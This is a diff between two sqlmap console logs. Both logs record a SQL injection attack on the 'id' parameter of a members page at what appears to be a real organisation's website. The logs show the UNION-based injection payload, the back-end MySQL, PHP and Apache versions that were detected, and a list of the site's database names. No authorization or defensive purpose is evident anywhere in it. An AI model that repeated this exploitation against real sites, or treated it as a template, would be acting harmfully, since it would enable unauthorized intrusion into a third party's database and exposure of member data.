@@ -1,23 +1,23 @@
         ___
        __H__
  ___ ___[)]_____ ___ ___  {1.5.7#stable}
-|_ -| . [']     | .'| . |
-|___|_  [)]_|_|_|__,|  _|
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
       |_|V...       |_|   http://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 14:37:56 /2021-12-02/
+[*] starting @ 15:55:01 /2021-12-14/
 
-[?1049h[22;0;0t[1;43r(B[m[4l[?7h[43;1H[?1049l[23;0;0t[?1l>[14:37:56] [INFO] using 'STDIN' for parsing targets list
+[?1049h[22;0;0t[1;43r(B[m[4l[?7h[43;1H[?1049l[23;0;0t[?1l>[15:55:01] [INFO] using 'STDIN' for parsing targets list
 URL 1:
 GET http://www.asfaa.org/members.php?id=1
 do you want to test this URL? [Y/n/q]
 > Y
-[14:37:56] [INFO] testing URL 'http://www.asfaa.org/members.php?id=1'
-[14:37:56] [INFO] resuming back-end DBMS 'mysql' 
-[14:37:56] [INFO] using '/home/capt/.sqlmap/output/results-12022021_0237pm.csv' as the CSV results file in multiple targets mode
-[14:37:56] [INFO] testing connection to the target URL
+[15:55:01] [INFO] testing URL 'http://www.asfaa.org/members.php?id=1'
+[15:55:01] [INFO] resuming back-end DBMS 'mysql' 
+[15:55:01] [INFO] using '/home/capt/.sqlmap/output/results-12142021_0355pm.csv' as the CSV results file in multiple targets mode
+[15:55:01] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: id (GET)
@@ -38,19 +38,19 @@ Parameter: id (GET)
     Payload: id=-8807 UNION ALL SELECT NULL,CONCAT(0x7171767671,0x5463456666494f50514771416f414e62654d544e456255564c5a51494167445a794978627561724b,0x7170716b71),NULL,NULL-- -
 ---
 do you want to exploit this SQL injection? [Y/n] Y
-[14:37:57] [INFO] the back-end DBMS is MySQL
-web application technology: PHP 7.3.11, Apache 2.4.51
+[15:55:02] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.51, PHP 7.3.11
 back-end DBMS: MySQL >= 5.0 (Percona fork)
-[14:37:57] [INFO] fetching database names
-[14:37:58] [INFO] resumed: 'information_schema'
-[14:37:58] [INFO] resumed: 'db83231_acolop'
-[14:37:58] [INFO] resumed: 'db83231_asfaa'
+[15:55:02] [INFO] fetching database names
+[15:55:02] [INFO] resumed: 'information_schema'
+[15:55:02] [INFO] resumed: 'db83231_acolop'
+[15:55:02] [INFO] resumed: 'db83231_asfaa'
 available databases [3]:
 [*] db83231_acolop
 [*] db83231_asfaa
 [*] information_schema
 
-[14:37:58] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/capt/.sqlmap/output/results-12022021_0237pm.csv'
+[15:55:02] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/capt/.sqlmap/output/results-12142021_0355pm.csv'
 
-[*] ending @ 14:37:58 /2021-12-02/
+[*] ending @ 15:55:02 /2021-12-14/
 
